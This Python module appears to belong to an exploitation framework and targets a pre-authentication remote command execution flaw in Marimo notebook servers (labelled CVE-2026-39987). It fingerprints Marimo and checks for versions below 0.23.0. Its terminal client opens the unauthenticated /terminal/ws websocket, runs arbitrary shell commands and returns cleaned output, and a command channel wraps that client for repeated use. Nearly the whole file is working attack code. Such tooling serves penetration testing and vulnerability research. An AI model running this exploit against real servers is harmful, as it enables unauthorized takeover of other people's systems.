#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Marimo notebook server helpers (CVE-2026-39987 /terminal/ws pre-auth RCE)."""

from __future__ import annotations

import re
import ssl
import time
from typing import List, Optional, Tuple, Union

import websocket

MARIMO_DEFAULT_PORT = 2718
MARIMO_PATCHED_VERSION = "0.23.0"
MARIMO_TERMINAL_WS = "/terminal/ws"
MARIMO_VERSION_RE = re.compile(r"(0\.\d+\.\d+)")
PROMPT_RE = re.compile(r"^[\w.\-]+@[\w.\-]+:[^\s#$\r\n]*[#$]\s*$")


def marimo_version_tuple(version: str) -> Tuple[int, ...]:
    parts = [int(p) for p in re.findall(r"\d+", str(version or ""))]
    return tuple(parts) if parts else ()


def marimo_version_lt(left: str, right: str) -> bool:
    a = marimo_version_tuple(left)
    b = marimo_version_tuple(right)
    if not a or not b:
        return False
    width = max(len(a), len(b))
    return a + (0,) * (width - len(a)) < b + (0,) * (width - len(b))


def marimo_parse_version(text: str) -> str:
    match = MARIMO_VERSION_RE.search(text or "")
    return match.group(1) if match else ""


def _as_text(chunk: Union[str, bytes, None]) -> str:
    if chunk is None:
        return ""
    if isinstance(chunk, bytes):
        return chunk.decode("utf-8", errors="replace")
    return str(chunk)


def marimo_clean_output(raw: str, command: str = "") -> str:
    """Strip echoed command and shell prompts from PTY output."""
    lines: List[str] = []
    cmd = (command or "").strip()
    for line in (raw or "").replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        stripped = line.strip()
        if not stripped:
            continue
        if cmd and (stripped == cmd or stripped.endswith(cmd)):
            continue
        if PROMPT_RE.match(stripped) or stripped.endswith("$") or stripped.endswith("#"):
            # Keep prompt-only lines out of command results.
            if len(stripped) < 80 and ("@" in stripped or stripped in ("$", "#")):
                continue
        lines.append(line.rstrip())
    return "\n".join(lines).strip()


class MarimoTerminalClient:
    """Unauthenticated PTY bridge over Marimo ``/terminal/ws``."""

    def __init__(
        self,
        host: str,
        port: int = MARIMO_DEFAULT_PORT,
        path: str = MARIMO_TERMINAL_WS,
        ssl_enabled: bool = False,
        verify_ssl: bool = False,
        timeout: float = 10.0,
        max_wait: float = 2.0,
    ):
        self.host = str(host or "").strip()
        self.port = int(port or MARIMO_DEFAULT_PORT)
        self.path = path if str(path).startswith("/") else f"/{path}"
        self.ssl_enabled = bool(ssl_enabled)
        self.verify_ssl = bool(verify_ssl)
        self.timeout = float(timeout or 10.0)
        self.max_wait = float(max_wait or 2.0)
        self.ws: Optional[websocket.WebSocket] = None

    @property
    def ws_url(self) -> str:
        scheme = "wss" if self.ssl_enabled else "ws"
        return f"{scheme}://{self.host}:{self.port}{self.path}"

    def connect(self) -> websocket.WebSocket:
        sslopt = None
        if self.ssl_enabled and not self.verify_ssl:
            sslopt = {"cert_reqs": ssl.CERT_NONE, "check_hostname": False}
        self.ws = websocket.create_connection(
            self.ws_url,
            timeout=self.timeout,
            sslopt=sslopt,
        )
        self.drain(settle=0.4)
        return self.ws

    def close(self) -> None:
        if self.ws:
            try:
                self.ws.close()
            except Exception:
                pass
            self.ws = None

    def drain(self, settle: float = 0.3) -> str:
        """Discard initial PTY banner / prompt noise."""
        if not self.ws:
            return ""
        chunks: List[str] = []
        self.ws.settimeout(settle)
        deadline = time.time() + max(settle, 0.1)
        while time.time() < deadline:
            try:
                data = self.ws.recv()
            except Exception:
                break
            text = _as_text(data)
            if text:
                chunks.append(text)
        return "".join(chunks)

    def recv_until(self, max_wait: Optional[float] = None) -> str:
        if not self.ws:
            return ""
        wait = float(self.max_wait if max_wait is None else max_wait)
        chunks: List[str] = []
        self.ws.settimeout(min(0.35, max(wait, 0.1)))
        deadline = time.time() + max(wait, 0.1)
        while time.time() < deadline:
            try:
                data = self.ws.recv()
            except Exception:
                continue
            text = _as_text(data)
            if text:
                chunks.append(text)
        return "".join(chunks)

    def send_raw(self, data: str) -> None:
        if not self.ws:
            raise ValueError("WebSocket is not connected")
        self.ws.send(data)

    def execute(self, command: str, max_wait: Optional[float] = None) -> str:
        if not command:
            return ""
        if not self.ws:
            self.connect()
        payload = command if command.endswith("\n") else command + "\n"
        self.send_raw(payload)
        # Brief settle so slow SSL / remote PTYs start producing output.
        time.sleep(0.35)
        raw = self.recv_until(max_wait=max_wait)
        return marimo_clean_output(raw, command)


class MarimoCmdChannel:
    """http_cmd session bridge — reconnects per command for resilience."""

    def __init__(self, factory):
        self._factory = factory

    def run_command(self, command: str) -> str:
        client: MarimoTerminalClient = self._factory()
        try:
            client.connect()
            return client.execute(command)
        finally:
            client.close()


def marimo_http_version(http_get, base_path: str = "/") -> str:
    """Best-effort version from ``/api/version`` using an Http_client-style getter."""
    root = (base_path or "/").rstrip("/")
    path = f"{root}/api/version" if root else "/api/version"
    try:
        response = http_get(path)
    except Exception:
        return ""
    if not response or int(getattr(response, "status_code", 0) or 0) != 200:
        return ""
    body = getattr(response, "text", "") or ""
    return marimo_parse_version(body)


def marimo_looks_like(http_get, base_path: str = "/") -> bool:
    root = (base_path or "/").rstrip("/")

    def _join(rel: str) -> str:
        if not root or root == "/":
            return rel if rel.startswith("/") else f"/{rel}"
        return f"{root}{rel if rel.startswith('/') else '/' + rel}"

    for rel in ("/", "/favicon.ico", "/api/version"):
        path = _join(rel)
        try:
            response = http_get(path)
        except Exception:
            continue
        if not response:
            continue
        text = (getattr(response, "text", "") or "").lower()
        headers = {str(k).lower(): str(v) for k, v in (getattr(response, "headers", {}) or {}).items()}
        if "marimo-version" in text or "marimo" in text[:2000]:
            return True
        if "marimo" in headers.get("server", ""):
            return True
        if rel.endswith("version") and marimo_parse_version(getattr(response, "text", "") or ""):
            return True
    return False
